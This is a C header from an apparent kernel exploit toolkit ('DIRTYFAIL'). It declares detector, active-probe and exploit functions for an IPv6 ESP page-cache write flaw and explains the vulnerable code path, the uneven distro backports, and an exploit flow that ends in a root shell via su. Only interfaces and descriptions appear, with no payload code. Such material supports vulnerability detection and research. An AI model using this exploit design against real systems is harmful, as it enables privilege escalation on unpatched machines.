/*
 * DIRTYFAIL — dirtyfrag_esp6.h
 *
 * IPv6 dual of the xfrm-ESP page-cache write (CVE-2026-43284).
 *
 * `esp6_input()` carries the same `if (!skb_has_frag_list(skb)) goto
 * skip_cow` branch as `esp_input()`. The mainline patch
 * f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4 covers BOTH v4 and v6,
 * but some distro backports may have shipped only the v4 fix —
 * particularly when they cherry-picked the ipv4 patch in isolation.
 *
 * A vulnerable system in the wild may therefore be:
 *   - patched on v4, vulnerable on v6
 *   - patched on v6, vulnerable on v4
 *   - vulnerable on both
 *
 * This module is the v6 detector + exploit. Differences from the v4
 * path:
 *   - AF_INET6 sockets, ::1 source/dest, sockaddr_in6
 *   - XFRM SA registered with family=AF_INET6 and 16-byte addresses
 *   - ESP packet padded to >= 48 bytes total to clear the
 *     `xfrm6_input.c` size gate (which v4 does not have)
 */

#ifndef DIRTYFAIL_DIRTYFRAG_ESP6_H
#define DIRTYFAIL_DIRTYFRAG_ESP6_H

#include "common.h"

df_result_t dirtyfrag_esp6_detect(void);

/* OUTER (init ns): prompts → fork → wait → verify → su.
 * INNER (bypass userns): SA reg + trigger only. */
df_result_t dirtyfrag_esp6_exploit(bool do_shell);
df_result_t dirtyfrag_esp6_exploit_inner(void);

/* Active probe: fires the v6 ESP-in-UDP trigger against a /tmp sentinel
 * file (never /etc/passwd) and reports whether the marker landed.
 * Used by `--scan --active`. Returns DF_VULNERABLE on marker hit, DF_OK
 * if the kernel is patched (no STORE), DF_PRECOND_FAIL if AA-blocked.
 * The inner half runs in the bypass userns and reads
 * DIRTYFAIL_PROBE_SENTINEL for the target path. */
df_result_t dirtyfrag_esp6_active_probe(void);
df_result_t dirtyfrag_esp6_active_probe_inner(void);

#endif
